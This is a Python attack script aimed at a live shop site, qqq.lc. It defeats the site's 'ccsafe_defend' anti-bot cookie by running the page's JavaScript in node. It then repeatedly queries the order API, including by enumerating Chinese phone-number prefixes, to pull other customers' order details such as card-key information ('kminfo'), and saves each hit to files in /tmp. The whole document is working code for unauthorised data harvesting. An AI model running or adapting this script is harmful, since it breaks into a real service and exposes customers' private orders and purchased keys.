#!/usr/bin/env python3
import re,subprocess,json,time
from pathlib import Path
HOST='qqq.lc';BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()
def curl(path, method='GET', data=None, headers=None, t=40):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=path if path.startswith('http') else BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr)
    return body
def pass_cc():
    body=curl('/')
    m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
    val=subprocess.check_output(['node','-e','console.log('+m.group(1)+')'],timeout=20).decode().strip()
    jar.c['ccsafe_defend']=val; jar.c['ccsafe_defend_time']='2'
    curl('/'); curl('/user/login.php')
pass_cc()
xhr={'X-Requested-With':'XMLHttpRequest'}
# get fresh page1 orders and poll details 12 rounds ~60s
found=[]
for rnd in range(12):
    body=curl('/ajax.php?act=query',method='POST',data='querytype=1&qq=1&page=1',headers=xhr)
    j=json.loads(body)
    data=j.get('data') or {}
    print(f'ROUND {rnd} n={len(data)}')
    for o in list(data.values())[:8]:
        b=curl('/ajax.php?act=order',method='POST',data=f'id={o["id"]}&skey={o["skey"]}',headers=xhr)
        try:d=json.loads(b)
        except: continue
        interesting={k:d.get(k) for k in ('list','list_result','kminfo','result','status','alert')}
        if any(interesting[k] not in (None,'',[],0) for k in ('list','list_result','kminfo','result')):
            print('HIT', o['id'], interesting)
            found.append({'id':o['id'],'skey':o['skey'],'detail':d})
            Path(f'/tmp/qqqlc_hit_{o["id"]}.json').write_text(b)
        # also print status/list briefly
        if rnd==0:
            print(' ', o['id'], 'st', d.get('status'), 'list', d.get('list'), 'km', d.get('kminfo'))
        time.sleep(0.2)
    time.sleep(4)
print('FOUND', len(found))
# try querytype exact match on longer inputs that look like phone prefixes
for qq in ['13','15','17','18','19','130','131','132','133','135','136','137','138','139','150','151','152','155','156','157','158','159','170','171','172','173','175','176','177','178','180','181','182','183','185','186','187','188','189']:
    body=curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={qq}&page=1',headers=xhr)
    j=json.loads(body)
    tot=j.get('total') or 0
    if tot:
        print(f'phoneish qq={qq} total={tot}')
        # check first few details for list
        for o in list((j.get('data') or {}).values())[:3]:
            b=curl('/ajax.php?act=order',method='POST',data=f'id={o["id"]}&skey={o["skey"]}',headers=xhr)
            d=json.loads(b)
            if d.get('list') or d.get('kminfo') or d.get('result'):
                print('PHONE_HIT', qq, o['id'], d.get('list'), d.get('kminfo'), d.get('result'))
                Path(f'/tmp/qqqlc_hit_{o["id"]}.json').write_text(b)
                found.append(d)
            time.sleep(0.2)
    time.sleep(0.25)
print('DONE FOUND', len(found))
